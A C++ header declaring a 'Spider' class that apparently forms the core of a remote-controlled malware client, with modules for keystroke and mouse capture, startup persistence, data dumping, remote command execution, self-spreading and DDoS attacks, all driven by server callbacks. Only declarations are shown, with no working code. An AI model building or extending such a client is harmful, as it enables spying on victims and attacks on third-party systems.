#ifndef SPIDER_HPP_
#define SPIDER_HPP_

#include <memory>
#include "Network.hpp"
#include "Mouse.hpp"
#include "Startup.hpp"
#include "Dump.hpp"
#include "Exec.hpp"
#include "Spread.hpp"
#include "Message.hpp"
#include "Keyboard.hpp"
#include "Ddos.hpp"
#include <functional>
#include <boost/algorithm/string/replace.hpp>



class Spider : public Network {

public:
  Spider(boost::asio::io_service &io_service, tcp::resolver::iterator const &endpoint_iterator);
  Spider(Spider &obj);
  ~Spider();
  Spider &operator=(const Spider &obj);

  void start(boost::asio::io_service &io_service);
  void stop();
  void initModules();
  void mainLoop();

  void connectCB(std::string const &value);
  void reconnectCB(std::string const &value);
  void disconnectCB(std::string const &value);

  void setStatusCB(boost::property_tree::ptree &root);
  void statusCB(boost::property_tree::ptree &root);
  void doExecCB(boost::property_tree::ptree &root);
  void ddosCB(boost::property_tree::ptree &root);
  void uninstallCB(boost::property_tree::ptree &root);


private:
	void _connectRoutine();

	std::string const _makeJson(Request module, std::string const &content);
	std::deque<std::pair<Request, std::string>> _sendingQueue;
	tcp::resolver::iterator _endpoint;
	bool _uninstall;
	std::string _lastExec;
	Keyboard _keyboard;
	Mouse _mouse;
	Startup _startup;
	Dump _dump;
	Exec _exec;
	Spread _spread;
	Ddos _ddos;

	Network _network;

};

#endif /*SPIDER_HPP_*/
